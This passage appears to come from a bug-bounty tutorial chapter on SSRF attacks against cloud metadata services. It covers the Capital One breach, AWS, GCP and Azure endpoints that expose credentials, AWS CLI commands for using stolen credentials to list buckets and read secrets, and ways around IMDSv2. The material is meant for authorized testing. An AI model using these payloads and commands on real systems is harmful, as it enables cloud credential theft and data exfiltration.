<section id="ch7">
  <div class="chapter-header" data-ch="07">
    <div class="ch-label">Chapter 07</div>
    <h2>Cloud Metadata Attacks — The $50K Prize</h2>
    <p>The highest-value SSRF target in 2025. Cloud metadata endpoints serve temporary credentials that unlock entire cloud infrastructures.</p>
  </div>

  <h3>7.1 Why Cloud Metadata Is the Ultimate Target</h3>
  <p>Every major cloud provider runs an internal-only HTTP metadata service. This service is reachable only from inside the VM/container instance — making it the perfect SSRF target. The metadata service returns the temporary IAM credentials attached to that instance. Those credentials can be used to call AWS/GCP/Azure APIs externally. This is how SSRF becomes cloud infrastructure compromise.</p>

  <div class="info-box danger">
    <div class="box-title">💀 The Capital One Attack Chain</div>
    <p>1. SSRF vulnerability in a WAF component (ModSecurity)</p>
    <p>2. Attacker queries <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role</code></p>
    <p>3. Receives temporary AccessKeyId, SecretAccessKey, SessionToken</p>
    <p>4. Uses AWS CLI with those credentials to list 700+ S3 buckets</p>
    <p>5. Downloads 30GB of data including 106 million credit card applications</p>
    <p>6. Capital One paid $80M in regulatory fines + $190M in class action settlement</p>
  </div>

  <h3>7.2 AWS Metadata (IMDSv1)</h3>

  <pre><span class="c"># Root metadata index</span>
http://169.254.169.254/latest/meta-data/

<span class="c"># Critical paths — always try these:</span>
<span class="ok">http://169.254.169.254/latest/meta-data/iam/security-credentials/</span>
<span class="c"># → Returns: role-name (e.g., ISRM-WAF-Role)</span>

<span class="ok">http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME</span>
<span class="c"># → Returns JSON with:
# {
#   "Code": "Success",
#   "Type": "AWS-HMAC",
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "wJalrXUtn...",
#   "Token": "AQoDYXdzE...",
#   "Expiration": "2024-01-01T12:00:00Z"
# }</span>

<span class="c"># Other useful paths:</span>
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/placement/region
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
http://169.254.169.254/latest/user-data           <span class="c"># Often contains startup scripts with hardcoded secrets</span>
http://169.254.169.254/latest/dynamic/instance-identity/document</pre>

  <h3>7.3 Google Cloud (GCP) Metadata</h3>

  <pre><span class="c"># GCP requires a custom header — but if app already sends it, you get full access</span>
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/

<span class="c"># Must include header: Metadata-Flavor: Google
# If the vulnerable app adds this header, you get full metadata access</span>

<span class="c"># Key endpoints:</span>
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
<span class="c"># → Returns OAuth2 access token for the instance's service account</span>

http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env  <span class="c"># K8s secrets</span></pre>

  <h3>7.4 Azure Metadata</h3>

  <pre>http://169.254.169.254/metadata/instance?api-version=2021-02-01
<span class="c"># Requires: Metadata: true header</span>

http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&amp;api-version=2018-02-01
<span class="c"># → Returns managed identity access token for Azure Resource Manager</span></pre>

  <h3>7.5 After Getting Credentials — What to Do</h3>

  <span class="pre-label">AWS credential exploitation (for PoC in authorized testing)</span>
  <pre><span class="c"># Configure AWS CLI with stolen temporary credentials</span>
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="wJalrXUtn..."
export AWS_SESSION_TOKEN="AQoDYXdzE..."

<span class="c"># What IAM role can this identity do?</span>
aws sts get-caller-identity

<span class="c"># List all S3 buckets (what Capital One attacker did)</span>
aws s3 ls

<span class="c"># List EC2 instances (scope of compromise)</span>
aws ec2 describe-instances --region us-east-1

<span class="c"># Check IAM permissions</span>
aws iam list-attached-role-policies --role-name ROLE-NAME
aws iam get-role-policy --role-name ROLE-NAME --policy-name POLICY-NAME

<span class="c"># Read secrets from Secrets Manager</span>
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id SECRET-NAME</pre>

  <div class="info-box bounty">
    <div class="box-title">🎯 Bug Bounty Strategy</div>
    <p>For maximum bounty: demonstrate that you can retrieve the AccessKeyId and first 8 chars of SecretAccessKey. Do NOT actually download data or use the credentials. Call <code>sts:GetCallerIdentity</code> to prove validity — it's read-only and the definitive PoC. Document the IAM role name and its attached policies to show scope of impact. This is what turns a medium-severity SSRF into a critical finding worth $10K–$50K.</p>
  </div>

  <h3>7.6 IMDSv2 and Why It Matters</h3>
  <p>AWS released IMDSv2 after the Capital One breach. IMDSv2 requires a session token obtained via a PUT request before any GET to the metadata service. Simple SSRF payloads using GET to <code>169.254.169.254</code> will return 401 Unauthorized. However:</p>

  <pre><span class="c"># IMDSv2 requires PUT first to get a token</span>
<span class="bad">GET</span> http://169.254.169.254/latest/meta-data/  <span class="c"># → 401 if IMDSv2 enforced</span>

<span class="c"># IMDSv2 requires:</span>
<span class="ok">PUT</span> http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
<span class="c"># → Returns: token value</span>

<span class="ok">GET</span> http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: TOKEN-VALUE
<span class="c"># → Returns metadata</span>

<span class="c"># SSRF bypass: if the app makes POST/PUT requests,
# you can sometimes chain IMDSv2 via SSRF that supports PUT method
# or use SSRF in a context where the app already has a metadata token</span></pre>

</section>

